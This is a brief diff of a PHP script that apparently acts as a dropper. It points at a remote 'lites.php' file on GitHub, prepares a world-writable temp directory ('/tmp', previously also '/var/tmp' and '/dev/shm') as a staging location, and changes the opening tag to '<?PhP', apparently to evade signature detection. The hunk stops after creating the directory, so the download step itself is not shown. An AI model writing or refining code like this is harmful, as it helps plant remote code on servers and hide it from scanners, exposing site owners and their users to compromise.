@@ -1,8 +1,8 @@
-<?php
+<?PhP
 
     $url = 'https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/lites.php';
     
-    $targetDir = '/var/tmp','/tmp','/dev/shm';
+    $targetDir = '/tmp';
     
     if (!is_dir($targetDir)) {
         mkdir($targetDir, 0777, true);
